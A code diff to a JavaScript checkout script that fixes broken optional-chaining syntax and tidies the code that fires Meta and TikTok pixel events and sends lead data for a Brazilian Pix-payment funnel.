         ...(utm || {}),
-        referrer: utm ? .referrer || document.referrer || ''
+        referrer: utm?.referrer || document.referrer || ''
     });
 
     if (hasMeta && hasTikTok) {
@@ -10206,45 +9150,45 @@ function resolveTrackedPixelProviders(utm = {}, options = {}) {
 }
 
 function buildPixelValueData(payload = {}) {
-    const explicitValue = Number(payload ? .amount);
-    const shippingValue = Number(payload ? .shipping ? .price || 0);
-    const bumpValue = Number(payload ? .bump ? .price || 0);
+    const explicitValue = Number(payload?.amount);
+    const shippingValue = Number(payload?.shipping?.price || 0);
+    const bumpValue = Number(payload?.bump?.price || 0);
     const rewardValue = Number(
-        payload ? .reward ? .checkoutExtraPrice ||
-        payload ? .reward ? .extraPrice ||
-        payload ? .pix ? .rewardExtraPrice ||
+        payload?.reward?.checkoutExtraPrice ||
+        payload?.reward?.extraPrice ||
+        payload?.pix?.rewardExtraPrice ||
         0
     );
-    const computedValue = Number.isFinite(shippingValue + bumpValue + rewardValue) ?
-        Number((shippingValue + bumpValue + rewardValue).toFixed(2)) :
-        0;
+    const computedValue = Number.isFinite(shippingValue + bumpValue + rewardValue)
+        ? Number((shippingValue + bumpValue + rewardValue).toFixed(2))
+        : 0;
     const totalValue = Number.isFinite(explicitValue) && explicitValue > 0 ? explicitValue : computedValue;
-    const contentName = payload ? .isUpsell ?
-        String(payload ? .upsell ? .title || payload ? .shipping ? .name || payload ? .reward ? .name || '').trim() :
-        String(payload ? .reward ? .name || payload ? .shipping ? .name || payload ? .upsell ? .title || '').trim();
+    const contentName = payload?.isUpsell
+        ? String(payload?.upsell?.title || payload?.shipping?.name || payload?.reward?.name || '').trim()
+        : String(payload?.reward?.name || payload?.shipping?.name || payload?.upsell?.title || '').trim();
     return {
         totalValue,
         contentName,
-        contentCategory: payload ? .isUpsell ? 'upsell' : 'checkout'
+        contentCategory: payload?.isUpsell ? 'upsell' : 'checkout'
     };
 }
 
 async function initMarketing() {
     const site = await ensureSiteConfig();
-    const pixel = site ? .pixel || state.pixelConfig || null;
-    const tiktokPixel = site ? .tiktokPixel || state.tiktokPixelConfig || null;
+    const pixel = site?.pixel || state.pixelConfig || null;
+    const tiktokPixel = site?.tiktokPixel || state.tiktokPixelConfig || null;
     const routing = resolveTrackedPixelProviders(getUtmData(), {
         metaConfig: pixel,
         tiktokConfig: tiktokPixel
     });
     const metaEnabled = isBrowserPixelEnabled(pixel);
     const tiktokEnabled = isBrowserPixelEnabled(tiktokPixel);
-    const hasResolvedSource = !!String(routing ? .sourcePlatform || '').trim();
-    const shouldSendMetaPageView = metaEnabled && pixel.events ? .page_view !== false && (routing.meta || !hasResolvedSource);
-    const shouldSendTikTokPageView = tiktokEnabled && tiktokPixel.events ? .page_view !== false && (routing.tiktok || !hasResolvedSource);
-    const page = String(document.body ? .dataset ? .page || '').trim();
+    const hasResolvedSource = !!String(routing?.sourcePlatform || '').trim();
+    const shouldSendMetaPageView = metaEnabled && pixel.events?.page_view !== false && (routing.meta || !hasResolvedSource);
+    const shouldSendTikTokPageView = tiktokEnabled && tiktokPixel.events?.page_view !== false && (routing.tiktok || !hasResolvedSource);
+    const page = String(document.body?.dataset?.page || '').trim();
     const pixData = loadPix() || {};
-    const pixAmount = Number(pixData ? .amount || 0);
+    const pixAmount = Number(pixData?.amount || 0);
 
     if (metaEnabled) {
         getMetaPixelTargets(pixel).forEach((targetId) => loadFacebookPixel(targetId));
@@ -10262,19 +9206,17 @@ async function initMarketing() {
     }
 
     if (routing.meta && metaEnabled) {
-        if (page === 'pix' && pixel.events ? .checkout !== false) {
+        if (page === 'pix' && pixel.events?.checkout !== false) {
             fireMetaPixelEvent('InitiateCheckout', {
                 currency: 'BRL',
-                ...(Number.isFinite(pixAmount) && pixAmount > 0 ? {
-                    value: Number(pixAmount.toFixed(2))
-                } : {})
+                ...(Number.isFinite(pixAmount) && pixAmount > 0 ? { value: Number(pixAmount.toFixed(2)) } : {})
             }, {
                 eventID: getCurrentInitiateCheckoutEventId()
             });
         }
 
         // Ensure /processando always sends ViewContent after pixel config is ready.
-        if (page === 'processing' && pixel.events ? .quiz_view !== false) {
+        if (page === 'processing' && pixel.events?.quiz_view !== false) {
             fireMetaPixelEvent('ViewContent', {
                 content_name: 'processando'
             }, {
@@ -10284,17 +9226,15 @@ async function initMarketing() {
     }
 
     if (routing.tiktok && tiktokEnabled) {
-        if (page === 'pix' && tiktokPixel.events ? .checkout !== false) {
+        if (page === 'pix' && tiktokPixel.events?.checkout !== false) {
             fireTikTokPixelEvent('InitiateCheckout', {
                 content_type: 'product',
                 currency: 'BRL',
-                ...(Number.isFinite(pixAmount) && pixAmount > 0 ? {
-                    value: Number(pixAmount.toFixed(2))
-                } : {})
+                ...(Number.isFinite(pixAmount) && pixAmount > 0 ? { value: Number(pixAmount.toFixed(2)) } : {})
             });
         }
 
-        if (page === 'processing' && tiktokPixel.events ? .quiz_view !== false) {
+        if (page === 'processing' && tiktokPixel.events?.quiz_view !== false) {
             fireTikTokPixelEvent('ViewContent', {
                 content_type: 'product',
                 description: 'processando'
@@ -10309,7 +9249,7 @@ function fireMetaPixelEvent(eventName, data = {}, options = {}) {
     pixelTargets.forEach((pixelId) => loadFacebookPixel(pixelId));
     if (!window.fbq) return;
     const hasOptions = options && Object.keys(options).length > 0;
-    const eventId = String(options ? .eventID || options ? .eventId || '').trim();
+    const eventId = String(options?.eventID || options?.eventId || '').trim();
     const shouldDedupe = shouldDedupePixelByEventId(eventId);
     for (const pixelId of pixelTargets) {
         if (shouldDedupe && hasSentPixelEvent(`meta:${pixelId}`, eventName, eventId)) {
@@ -10344,13 +9284,13 @@ function firePixelEvent(eventName, data = {}, options = {}) {
 }
 
 function fireTikTokPixelEvent(eventName, data = {}, options = {}) {
-    const pixelId = String(state.tiktokPixelConfig ? .id || '').trim();
+    const pixelId = String(state.tiktokPixelConfig?.id || '').trim();
     if (!pixelId) return;
     loadTikTokPixel(pixelId);
     const tracker = getTikTokTracker(pixelId);
     if (!tracker || typeof tracker.track !== 'function') return;
     const hasOptions = options && Object.keys(options).length > 0;
-    const eventId = String(options ? .event_id || options ? .eventId || '').trim();
+    const eventId = String(options?.event_id || options?.eventId || '').trim();
     const shouldDedupe = shouldDedupePixelByEventId(eventId);
     if (shouldDedupe && hasSentPixelEvent('tiktok', eventName, eventId)) {
         return;
@@ -10371,107 +9311,75 @@ function fireTikTokPixelEvent(eventName, data = {}, options = {}) {
 function maybeTrackMetaPixel(eventName, payload = {}) {
     const pixel = state.pixelConfig;
     if (!pixel || !pixel.enabled || !pixel.id) return;
-    const {
-        totalValue,
-        contentName,
-        contentCategory
-    } = buildPixelValueData(payload);
-    if (eventName === 'personal_submitted' && pixel.events ? .lead !== false) {
-        const leadEventId = String(payload ? .eventId || buildLeadEventId(payload ? .sessionId)).trim();
+    const { totalValue, contentName, contentCategory } = buildPixelValueData(payload);
+    if (eventName === 'personal_submitted' && pixel.events?.lead !== false) {
+        const leadEventId = String(payload?.eventId || buildLeadEventId(payload?.sessionId)).trim();
         payload.eventId = leadEventId;
-        fireMetaPixelEvent('Lead', {}, {
-            eventID: leadEventId
-        });
+        fireMetaPixelEvent('Lead', {}, { eventID: leadEventId });
     }
 
-    if (eventName === 'checkout_view' && pixel.events ? .checkout !== false) {
+    if (eventName === 'checkout_view' && pixel.events?.checkout !== false) {
         const addPaymentInfoEventId = String(
-            payload ? .addPaymentInfoEventId || payload ? .eventId || buildAddPaymentInfoEventId(payload ? .sessionId)
+            payload?.addPaymentInfoEventId || payload?.eventId || buildAddPaymentInfoEventId(payload?.sessionId)
         ).trim();
         payload.addPaymentInfoEventId = addPaymentInfoEventId;
         fireMetaPixelEvent('AddPaymentInfo', {
             currency: 'BRL',
-            ...(totalValue > 0 ? {
-                value: totalValue
-            } : {})
-        }, {
-            eventID: addPaymentInfoEventId
-        });
+            ...(totalValue > 0 ? { value: totalValue } : {})
+        }, { eventID: addPaymentInfoEventId });
     }
 
-    if (eventName === 'pix_paid' && pixel.events ? .purchase !== false) {
-        const purchaseEventId = String(payload ? .purchaseEventId || buildPurchaseEventId(payload)).trim();
+    if (eventName === 'pix_paid' && pixel.events?.purchase !== false) {
+        const purchaseEventId = String(payload?.purchaseEventId || buildPurchaseEventId(payload)).trim();
         payload.purchaseEventId = purchaseEventId;
         fireMetaPixelEvent('Purchase', {
             currency: 'BRL',
-            ...(totalValue > 0 ? {
-                value: totalValue
-            } : {}),
+            ...(totalValue > 0 ? { value: totalValue } : {}),
             content_name: contentName,
             content_category: contentCategory
-        }, {
-            eventID: purchaseEventId
-        });
+        }, { eventID: purchaseEventId });
     }
 }
 
 function maybeTrackTikTokPixel(eventName, payload = {}) {
     const pixel = state.tiktokPixelConfig;
     if (!pixel || !pixel.enabled || !pixel.id) return;
-    const {
-        totalValue,
-        contentName,
-        contentCategory
-    } = buildPixelValueData(payload);
+    const { totalValue, contentName, contentCategory } = buildPixelValueData(payload);
 
-    if (eventName === 'personal_submitted' && pixel.events ? .lead !== false) {
-        const leadEventId = String(payload ? .eventId || buildLeadEventId(payload ? .sessionId)).trim();
+    if (eventName === 'personal_submitted' && pixel.events?.lead !== false) {
+        const leadEventId = String(payload?.eventId || buildLeadEventId(payload?.sessionId)).trim();
         payload.eventId = leadEventId;
-        fireTikTokPixelEvent('SubmitForm', {}, {
-            event_id: leadEventId
-        });
+        fireTikTokPixelEvent('SubmitForm', {}, { event_id: leadEventId });
     }
 
-    if (eventName === 'checkout_view' && pixel.events ? .checkout !== false) {
+    if (eventName === 'checkout_view' && pixel.events?.checkout !== false) {
         const addPaymentInfoEventId = String(
-            payload ? .addPaymentInfoEventId || payload ? .eventId || buildAddPaymentInfoEventId(payload ? .sessionId)
+            payload?.addPaymentInfoEventId || payload?.eventId || buildAddPaymentInfoEventId(payload?.sessionId)
         ).trim();
         payload.addPaymentInfoEventId = addPaymentInfoEventId;
         fireTikTokPixelEvent('AddPaymentInfo', {
             content_type: 'product',
-            ...(contentName ? {
-                description: contentName
-            } : {}),
+            ...(contentName ? { description: contentName } : {}),
             currency: 'BRL',
-            ...(totalValue > 0 ? {
-                value: totalValue
-            } : {})
-        }, {
-            event_id: addPaymentInfoEventId
-        });
+            ...(totalValue > 0 ? { value: totalValue } : {})
+        }, { event_id: addPaymentInfoEventId });
     }
 
-    if (eventName === 'pix_paid' && pixel.events ? .purchase !== false) {
-        const purchaseEventId = String(payload ? .purchaseEventId || buildPurchaseEventId(payload)).trim();
+    if (eventName === 'pix_paid' && pixel.events?.purchase !== false) {
+        const purchaseEventId = String(payload?.purchaseEventId || buildPurchaseEventId(payload)).trim();
         payload.purchaseEventId = purchaseEventId;
         fireTikTokPixelEvent('Purchase', {
             content_type: 'product',
-            ...(contentName ? {
-                description: contentName
-            } : {}),
+            ...(contentName ? { description: contentName } : {}),
             currency: 'BRL',
-            ...(totalValue > 0 ? {
-                value: totalValue
-            } : {}),
+            ...(totalValue > 0 ? { value: totalValue } : {}),
             content_category: contentCategory
-        }, {
-            event_id: purchaseEventId
-        });
+        }, { event_id: purchaseEventId });
     }
 }
 
 function maybeTrackPixels(eventName, payload = {}) {
-    const routing = resolveTrackedPixelProviders(payload ? .utm || getUtmData());
+    const routing = resolveTrackedPixelProviders(payload?.utm || getUtmData());
     if (routing.meta) {
         maybeTrackMetaPixel(eventName, payload);
     }
@@ -10495,7 +9403,7 @@ function trackLead(eventName, extra = {}) {
         fbclid: pixelBrowser.fbclid || undefined,
         fbp: pixelBrowser.fbp || undefined,
         fbc: pixelBrowser.fbc || undefined,
-        ttclid: String(utm ? .ttclid || '').trim() || undefined,
+        ttclid: String(utm?.ttclid || '').trim() || undefined,
         personal: extra.personal || loadPersonal() || {},
         address: extra.address || loadAddress() || {},
         extra: extra.extra || loadAddressExtra() || {},
@@ -10518,17 +9426,13 @@ function trackLead(eventName, extra = {}) {
     try {
         const body = JSON.stringify(payload);
         if (navigator.sendBeacon) {
-            const blob = new Blob([body], {
-                type: 'application/json'
-            });
+            const blob = new Blob([body], { type: 'application/json' });
             navigator.sendBeacon('/api/lead/track', blob);
             return;
         }
         fetch('/api/lead/track', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body,
             keepalive: true
         }).catch(() => null);
@@ -10563,7 +9467,7 @@ function resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loading
     setHidden(addressResult, true);
     setHidden(freightBox, true);
     setHidden(loadingRow, true);
-    btnBuscar ? .classList.remove('hidden');
+    btnBuscar?.classList.remove('hidden');
 }
 
 function focusFirstControl(container) {
@@ -10823,3 +9727,4 @@ function redirect(url) {
     window.__ifbAllowUnload = true;
     window.location.href = target;
 }
+
